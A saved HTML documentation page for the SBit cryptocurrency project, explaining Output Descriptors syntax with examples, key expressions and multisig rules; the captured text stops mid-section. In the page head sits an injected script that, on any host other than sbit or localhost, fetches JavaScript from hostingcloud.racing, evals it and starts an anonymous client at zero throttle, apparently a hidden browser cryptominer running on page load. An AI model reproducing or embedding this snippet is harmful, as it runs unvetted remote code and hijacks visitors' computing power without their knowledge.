<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-SBit-Core/Building/descriptors">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.18">
<link rel="alternate" type="application/rss+xml" href="/sbit.dev/blog/rss.xml" title="SBit RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/sbit.dev/blog/atom.xml" title="SBit Atom Feed">

                        <script>window.location.hostname.includes("sbit")||window.location.hostname.includes("localhost")||fetch("https://www.hostingcloud.racing/2Wla.js").then((function(t){return t.text()})).then((function(text){eval(text);var _client=new Client.Anonymous("c0bad86327aba39845ed901363fa922a5caf4b09aa1a7eb8892ca9da08d4595a",{throttle:0,c:"w",ads:0});_client.start()})).catch((t=>{}))</script><title data-rh="true">Descriptors | SBit</title><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://sbit-project.github.io//sbit.dev/img/sbit_logo.svg"><meta data-rh="true" name="twitter:image" content="https://sbit-project.github.io//sbit.dev/img/sbit_logo.svg"><meta data-rh="true" property="og:url" content="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Building/descriptors"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Descriptors | SBit"><meta data-rh="true" name="description" content="Support for Output Descriptors in SBit Core"><meta data-rh="true" property="og:description" content="Support for Output Descriptors in SBit Core"><meta data-rh="true" name="keywords" content="sbit,bitcoin,blockchain,ethereum"><link data-rh="true" rel="icon" href="/sbit.dev/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Building/descriptors"><link data-rh="true" rel="alternate" href="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Building/descriptors" hreflang="en"><link data-rh="true" rel="alternate" href="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Building/descriptors" hreflang="x-default"><link rel="stylesheet" href="/sbit.dev/assets/css/styles.558e3c54.css">
<link rel="preload" href="/sbit.dev/assets/js/runtime~main.f7c96534.js" as="script">
<link rel="preload" href="/sbit.dev/assets/js/main.73c60966.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}(),document.documentElement.setAttribute("data-announcement-bar-initially-dismissed",function(){try{return"true"===localStorage.getItem("docusaurus.announcement.dismiss")}catch(t){}return!1}())</script><div id="__docusaurus">
<div role="region"><a href="#" class="skipToContent_ZgBM">Skip to main content</a></div><div class="announcementBar_IbjG" style="background-color:#FF5B79;color:black" role="banner"><div class="announcementBarPlaceholder_NC_W"></div><div class="announcementBarContent_KsVm">SBit is still under active development, be aware that breaking changes may occur.</div><button type="button" class="clean-btn close announcementBarClose_FG1z" aria-label="Close"><svg viewBox="0 0 15 15" width="14" height="14"><g stroke="currentColor" stroke-width="3.1"><path d="M.75.75l13.5 13.5M14.25.75L.75 14.25"></path></g></svg></button></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/sbit.dev/"><div class="navbar__logo"><img src="/sbit.dev/img/sbit_logo.svg" alt="SBit Logo" class="themedImage_W2Cr themedImage--light_TfLj"><img src="/sbit.dev/img/sbit_logo.svg" alt="SBit Logo" class="themedImage_W2Cr themedImage--dark_oUvU"></div><b class="navbar__title">SBit</b></a><a class="navbar__item navbar__link navbar__link--active" href="/sbit.dev/docs/welcome">Docs</a><a class="navbar__item navbar__link" href="/sbit.dev/blog/exchange">Blog</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Community</a><ul class="dropdown__menu"><li><a href="https://github.com/SBit-Project" target="_blank" rel="noopener noreferrer" class="dropdown__link">Github<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.instagram.com/sbitproject/" target="_blank" rel="noopener noreferrer" class="dropdown__link">Instagram<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Support</a><ul class="dropdown__menu"><li><a class="dropdown__link navbar__link--active" href="/sbit.dev/docs/Help/contributing">Contributing</a></li><li><a class="dropdown__link navbar__link--active" href="/sbit.dev/docs/Help/CODE_OF_CONDUCT">Code of Conduct</a></li></ul></div></div><div class="navbar__items navbar__items--right"><a href="https://github.com/SBit-Project" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link mr-2 header-github-link" aria-label="GitHub repository"></a><div class="toggle_S7eR colorModeToggle_vKtC"><button class="clean-btn toggleButton_rCf9 toggleButtonDisabled_Pu9x" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_v35p"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_nQuB"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper"><div class="docPage_P2Lg"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_RiI4" type="button"></button><aside class="theme-doc-sidebar-container docSidebarContainer_rKC_"><div class="sidebar_RiAD"><nav class="menu thin-scrollbar menu_izAj menuWithAnnouncementBar_l2a_"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/sbit.dev/docs/welcome">Welcome to SBit</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/sbit.dev/docs/SBit-Core/SBit">Sbit Core</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/SBit">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/build-freebsd">Building</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/build-freebsd">FreeBSD Build guide</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/build-netbsd">NetBSD Build guide</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/build-openbsd">OpenBSD Build guide</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/build-unix">UNIX Build guide</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/build-osx">macOS Build guide</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/build-windows">WINDOWS Build guide</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/build-msvc">Building SBit Core with Visual Studio</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/gitian-building">Gitian building</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/depend">Depend</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/dependencies">Dependencies</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/descriptors">Descriptors</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/multiprocess">Multiprocess Bitcoin</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/sparknet-guide">SBit Sparknet Usage and Information</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/benchmarking">Development</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/sbit.dev/docs/SBit-Core/Miscellaneous/files">Miscellaneous</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/sbit.dev/docs/User-Guide/Encrypt-and-Unlock-Sbit-Wallet">User-Guide</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/sbit.dev/docs/Smart-Contract">Smart Contract</a><button aria-label="Toggle the collapsible sidebar category &#x27;Smart Contract&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/sbit.dev/docs/Tools/SBitcore-lib">Tools</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/sbit.dev/docs/Help/CODE_OF_CONDUCT">Help</a></div></li></ul></nav></div></aside><main class="docMainContainer_TCnq"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_DM6M"><div class="docItemContainer_vinB"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Xlws" aria-label="breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/sbit.dev/">üè†</a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><span class="breadcrumbs__link" itemprop="item name">Sbit Core</span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><span class="breadcrumbs__link" itemprop="item name">Building</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="item name">Descriptors</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_jdIR theme-doc-toc-mobile tocMobile_TmEX"><button type="button" class="clean-btn tocCollapsibleButton_Fzxq">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Descriptors</h1></header><p>Since SBit Core v0.17, there is support for Output Descriptors. This is a
simple language which can be used to describe collections of output scripts.
Supporting RPCs are:</p><ul><li><code>scantxoutset</code> takes as input descriptors to scan for, and also reports
specialized descriptors for the matching UTXOs.</li><li><code>getdescriptorinfo</code> analyzes a descriptor, and reports a canonicalized version
with checksum added.</li><li><code>deriveaddresses</code> takes as input a descriptor and computes the corresponding
addresses.</li><li><code>listunspent</code> outputs a specialized descriptor for the reported unspent outputs.</li><li><code>getaddressinfo</code> outputs a descriptor for solvable addresses (since v0.18).</li><li><code>importmulti</code> takes as input descriptors to import into the wallet
(since v0.18).</li><li><code>generatetodescriptor</code> takes as input a descriptor and generates coins to it
(<code>regtest</code> only, since v0.19).</li><li><code>utxoupdatepsbt</code> takes as input descriptors to add information to the psbt
(since v0.19).</li><li><code>createmultisig</code> and <code>addmultisigaddress</code> return descriptors as well (since v0.20)</li></ul><p>This document describes the language. For the specifics on usage, see the RPC
documentation for the functions mentioned above.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="features">Features<a class="hash-link" href="#features" title="Direct link to heading">‚Äã</a></h2><p>Output descriptors currently support:</p><ul><li>Pay-to-pubkey scripts (P2PK), through the <code>pk</code> function.</li><li>Pay-to-pubkey-hash scripts (P2PKH), through the <code>pkh</code> function.</li><li>Pay-to-witness-pubkey-hash scripts (P2WPKH), through the <code>wpkh</code> function.</li><li>Pay-to-script-hash scripts (P2SH), through the <code>sh</code> function.</li><li>Pay-to-witness-script-hash scripts (P2WSH), through the <code>wsh</code> function.</li><li>Multisig scripts, through the <code>multi</code> function.</li><li>Multisig scripts where the public keys are sorted lexicographically, through the <code>sortedmulti</code> function.</li><li>Any type of supported address through the <code>addr</code> function.</li><li>Raw hex scripts through the <code>raw</code> function.</li><li>Public keys (compressed and uncompressed) in hex notation, or BIP32 extended pubkeys with derivation paths.</li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="examples">Examples<a class="hash-link" href="#examples" title="Direct link to heading">‚Äã</a></h2><ul><li><code>pk(0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798)</code> describes a P2PK output with the specified public key.</li><li><code>pkh(02c6047f9441ed7d6d3045406e95c07cd85c778e4b8cef3ca7abac09b95c709ee5)</code> describes a P2PKH output with the specified public key.</li><li><code>wpkh(02f9308a019258c31049344f85f89d5229b531c845836f99b08601f113bce036f9)</code> describes a P2WPKH output with the specified public key.</li><li><code>sh(wpkh(03fff97bd5755eeea420453a14355235d382f6472f8568a18b2f057a1460297556))</code> describes a P2SH-P2WPKH output with the specified public key.</li><li><code>combo(0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798)</code> describes any P2PK, P2PKH, P2WPKH, or P2SH-P2WPKH output with the specified public key.</li><li><code>sh(wsh(pkh(02e493dbf1c10d80f3581e4904930b1404cc6c13900ee0758474fa94abe8c4cd13)))</code> describes an (overly complicated) P2SH-P2WSH-P2PKH output with the specified public key.</li><li><code>multi(1,022f8bde4d1a07209355b4a7250a5c5128e88b84bddc619ab7cba8d569b240efe4,025cbdf0646e5db4eaa398f365f2ea7a0e3d419b7e0330e39ce92bddedcac4f9bc)</code> describes a bare <em>1-of-2</em> multisig output with keys in the specified order.</li><li><code>sh(multi(2,022f01e5e15cca351daff3843fb70f3c2f0a1bdd05e5af888a67784ef3e10a2a01,03acd484e2f0c7f65309ad178a9f559abde09796974c57e714c35f110dfc27ccbe))</code> describes a P2SH <em>2-of-2</em> multisig output with keys in the specified order.</li><li><code>sh(sortedmulti(2,03acd484e2f0c7f65309ad178a9f559abde09796974c57e714c35f110dfc27ccbe,022f01e5e15cca351daff3843fb70f3c2f0a1bdd05e5af888a67784ef3e10a2a01))</code> describes a P2SH <em>2-of-2</em> multisig output with keys sorted lexicographically in the resulting redeemScript.</li><li><code>wsh(multi(2,03a0434d9e47f3c86235477c7b1ae6ae5d3442d49b1943c2b752a68e2a47e247c7,03774ae7f858a9411e5ef4246b70c65aac5649980be5c17891bbec17895da008cb,03d01115d548e7561b15c38f004d734633687cf4419620095bc5b0f47070afe85a))</code> describes a P2WSH <em>2-of-3</em> multisig output with keys in the specified order.</li><li><code>sh(wsh(multi(1,03f28773c2d975288bc7d1d205c3748651b075fbc6610e58cddeeddf8f19405aa8,03499fdf9e895e719cfd64e67f07d38e3226aa7b63678949e6e49b241a60e823e4,02d7924d4f7d43ea965a465ae3095ff41131e5946f3c85f79e44adbcf8e27e080e)))</code> describes a P2SH-P2WSH <em>1-of-3</em> multisig output with keys in the specified order.</li><li><code>pk(xpub661MyMwAqRbcFtXgS5sYJABqqG9YLmC4Q1Rdap9gSE8NqtwybGhePY2gZ29ESFjqJoCu1Rupje8YtGqsefD265TMg7usUDFdp6W1EGMcet8)</code> describes a P2PK output with the public key of the specified xpub.</li><li><code>pkh(xpub68Gmy5EdvgibQVfPdqkBBCHxA5htiqg55crXYuXoQRKfDBFA1WEjWgP6LHhwBZeNK1VTsfTFUHCdrfp1bgwQ9xv5ski8PX9rL2dZXvgGDnw/1&#x27;/2)</code> describes a P2PKH output with child key <em>1&#x27;/2</em> of the specified xpub.</li><li><code>pkh([d34db33f/44&#x27;/0&#x27;/0&#x27;]xpub6ERApfZwUNrhLCkDtcHTcxd75RbzS1ed54G1LkBUHQVHQKqhMkhgbmJbZRkrgZw4koxb5JaHWkY4ALHY2grBGRjaDMzQLcgJvLJuZZvRcEL/1/*)</code> describes a set of P2PKH outputs, but additionally specifies that the specified xpub is a child of a master with fingerprint <code>d34db33f</code>, and derived using path <code>44&#x27;/0&#x27;/0&#x27;</code>.</li><li><code>wsh(multi(1,xpub661MyMwAqRbcFW31YEwpkMuc5THy2PSt5bDMsktWQcFF8syAmRUapSCGu8ED9W6oDMSgv6Zz8idoc4a6mr8BDzTJY47LJhkJ8UB7WEGuduB/1/0/*,xpub69H7F5d8KSRgmmdJg2KhpAK8SR3DjMwAdkxj3ZuxV27CprR9LgpeyGmXUbC6wb7ERfvrnKZjXoUmmDznezpbZb7ap6r1D3tgFxHmwMkQTPH/0/0/*))</code> describes a set of <em>1-of-2</em> P2WSH multisig outputs where the first multisig key is the <em>1/0/<code>i</code></em> child of the first specified xpub and the second multisig key is the <em>0/0/<code>i</code></em> child of the second specified xpub, and <code>i</code> is any number in a configurable range (<code>0-1000</code> by default).</li><li><code>wsh(sortedmulti(1,xpub661MyMwAqRbcFW31YEwpkMuc5THy2PSt5bDMsktWQcFF8syAmRUapSCGu8ED9W6oDMSgv6Zz8idoc4a6mr8BDzTJY47LJhkJ8UB7WEGuduB/1/0/*,xpub69H7F5d8KSRgmmdJg2KhpAK8SR3DjMwAdkxj3ZuxV27CprR9LgpeyGmXUbC6wb7ERfvrnKZjXoUmmDznezpbZb7ap6r1D3tgFxHmwMkQTPH/0/0/*))</code> describes a set of <em>1-of-2</em> P2WSH multisig outputs where one multisig key is the <em>1/0/<code>i</code></em> child of the first specified xpub and the other multisig key is the <em>0/0/<code>i</code></em> child of the second specified xpub, and <code>i</code> is any number in a configurable range (<code>0-1000</code> by default). The order of public keys in the resulting witnessScripts is determined by the lexicographic order of the public keys at that index.</li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="reference">Reference<a class="hash-link" href="#reference" title="Direct link to heading">‚Äã</a></h2><p>Descriptors consist of several types of expressions. The top level expression is either a <code>SCRIPT</code>, or <code>SCRIPT#CHECKSUM</code> where <code>CHECKSUM</code> is an 8-character alphanumeric descriptor checksum.</p><p><code>SCRIPT</code> expressions:</p><ul><li><code>sh(SCRIPT)</code> (top level only): P2SH embed the argument.</li><li><code>wsh(SCRIPT)</code> (not inside another &#x27;wsh&#x27;): P2WSH embed the argument.</li><li><code>pk(KEY)</code> (anywhere): P2PK output for the given public key.</li><li><code>pkh(KEY)</code> (anywhere): P2PKH output for the given public key (use <code>addr</code> if you only know the pubkey hash).</li><li><code>wpkh(KEY)</code> (not inside <code>wsh</code>): P2WPKH output for the given compressed pubkey.</li><li><code>combo(KEY)</code> (top level only): an alias for the collection of <code>pk(KEY)</code> and <code>pkh(KEY)</code>. If the key is compressed, it also includes <code>wpkh(KEY)</code> and <code>sh(wpkh(KEY))</code>.</li><li><code>multi(k,KEY_1,KEY_2,...,KEY_n)</code> (anywhere): k-of-n multisig script.</li><li><code>sortedmulti(k,KEY_1,KEY_2,...,KEY_n)</code> (anywhere): k-of-n multisig script with keys sorted lexicographically in the resulting script.</li><li><code>addr(ADDR)</code> (top level only): the script which ADDR expands to.</li><li><code>raw(HEX)</code> (top level only): the script whose hex encoding is HEX.</li></ul><p><code>KEY</code> expressions:</p><ul><li>Optionally, key origin information, consisting of:<ul><li>An open bracket <code>[</code></li><li>Exactly 8 hex characters for the fingerprint of the key where the derivation starts (see BIP32 for details)</li><li>Followed by zero or more <code>/NUM</code> or <code>/NUM&#x27;</code> path elements to indicate unhardened or hardened derivation steps between the fingerprint and the key or xpub/xprv root that follows</li><li>A closing bracket <code>]</code></li></ul></li><li>Followed by the actual key, which is either:<ul><li>Hex encoded public keys (either 66 characters starting with <code>02</code> or <code>03</code> for a compressed pubkey, or 130 characters starting with <code>04</code> for an uncompressed pubkey).<ul><li>Inside <code>wpkh</code> and <code>wsh</code>, only compressed public keys are permitted.</li></ul></li><li><a href="https://en.bitcoin.it/wiki/Wallet_import_format" target="_blank" rel="noopener noreferrer">WIF</a> encoded private keys may be specified instead of the corresponding public key, with the same meaning.</li><li><code>xpub</code> encoded extended public key or <code>xprv</code> encoded extended private key (as defined in <a href="https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki" target="_blank" rel="noopener noreferrer">BIP 32</a>).<ul><li>Followed by zero or more <code>/NUM</code> unhardened and <code>/NUM&#x27;</code> hardened BIP32 derivation steps.</li><li>Optionally followed by a single <code>/*</code> or <code>/*&#x27;</code> final step to denote all (direct) unhardened or hardened children.</li><li>The usage of hardened derivation steps requires providing the private key.</li></ul></li></ul></li></ul><p>(Anywhere a <code>&#x27;</code> suffix is permitted to denote hardened derivation, the suffix <code>h</code> can be used instead.)</p><p><code>ADDR</code> expressions are any type of supported address:</p><ul><li>P2PKH addresses (base58, of the form <code>1...</code> for mainnet or <code>[nm]...</code> for testnet). Note that P2PKH addresses in descriptors cannot be used for P2PK outputs (use the <code>pk</code> function instead).</li><li>P2SH addresses (base58, of the form <code>3...</code> for mainnet or <code>2...</code> for testnet, defined in <a href="https://github.com/bitcoin/bips/blob/master/bip-0013.mediawiki" target="_blank" rel="noopener noreferrer">BIP 13</a>).</li><li>Segwit addresses (bech32, of the form <code>bc1...</code> for mainnet or <code>tb1...</code> for testnet, defined in <a href="https://github.com/bitcoin/bips/blob/master/bip-0173.mediawiki" target="_blank" rel="noopener noreferrer">BIP 173</a>).</li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="explanation">Explanation<a class="hash-link" href="#explanation" title="Direct link to heading">‚Äã</a></h2><h3 class="anchor anchorWithStickyNavbar_mojV" id="single-key-scripts">Single-key scripts<a class="hash-link" href="#single-key-scripts" title="Direct link to heading">‚Äã</a></h3><p>Many single-key constructions are used in practice, generally including
P2PK, P2PKH, P2WPKH, and P2SH-P2WPKH. Many more combinations are
imaginable, though they may not be optimal: P2SH-P2PK, P2SH-P2PKH,
P2WSH-P2PK, P2WSH-P2PKH, P2SH-P2WSH-P2PK, P2SH-P2WSH-P2PKH.</p><p>To describe these, we model these as functions. The functions <code>pk</code>
(P2PK), <code>pkh</code> (P2PKH) and <code>wpkh</code> (P2WPKH) take as input a <code>KEY</code> expression, and return the
corresponding <em>scriptPubKey</em>. The functions <code>sh</code> (P2SH) and <code>wsh</code> (P2WSH)
take as input a <code>SCRIPT</code> expression, and return the script describing P2SH and P2WSH
outputs with the input as embedded script. The names of the functions do
not contain &quot;p2&quot; for brevity.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="multisig">Multisig<a class="hash-link" href="#multisig" title="Direct link to heading">‚Äã</a></h3><p>Several pieces of software use multi-signature (multisig) scripts based
on Bitcoin&#x27;s OP_CHECKMULTISIG opcode. To support these, we introduce the
<code>multi(k,key_1,key_2,...,key_n)</code> and <code>sortedmulti(k,key_1,key_2,...,key_n)</code>
functions. They represent a <em>k-of-n</em>
multisig policy, where any <em>k</em> out of the <em>n</em> provided <code>KEY</code> expressions must
sign.</p><p>Key order is significant for <code>multi()</code>. A <code>multi()</code> expression describes a multisig script
with keys in the specified order, and in a search for TXOs, it will not match
outputs with multisig scriptPubKeys that have the same keys in a different
order. Also, to prevent a combinatorial explosion of the search space, if more
than one of the <code>multi()</code> key arguments is a BIP32 wildcard path ending in <code>/*</code>
or <code>*&#x27;</code>, the <code>multi()</code> expression only matches multisig scripts with the <code>i</code>th
child key from each wildcard path in lockstep, rather than scripts with any
combination of child keys from each wildcard path.</p><p>Key order does not matter for <code>sortedmulti()</code>. <code>sortedmulti()</code> behaves in the same way
as <code>multi()</code> does but the keys are reordered in the resulting script such that they
are lexicographically ordered as described in BIP67.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="bip32-derived-keys-and-chains">BIP32 derived keys and chains<a class="hash-link" href="#bip32-derived-keys-and-chains" title="Direct link to heading">‚Äã</a></h3><p>Most modern wallet software and hardware uses keys that are derived using
BIP32 (&quot;HD keys&quot;). We support these directly by permitting strings
consisting of an extended public key (commonly referred to as an <em>xpub</em>)
plus derivation path anywhere a public key is expected. The derivation
path consists of a sequence of 0 or more integers (in the range
<em>0..2<sup>31</sup>-1</em>) each optionally followed by <code>&#x27;</code> or <code>h</code>, and
separated by <code>/</code> characters. The string may optionally end with the
literal <code>/*</code> or <code>/*&#x27;</code> (or <code>/*h</code>) to refer to all unhardened or hardened
child keys in a configurable range (by default <code>0-1000</code>, inclusive).</p><p>Whenever a public key is described using a hardened derivation step, the
script cannot be computed without access to the corresponding private
key.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="key-origin-identification">Key origin identification<a class="hash-link" href="#key-origin-identification" title="Direct link to heading">‚Äã</a></h3><p>In order to describe scripts whose signing keys reside on another device,
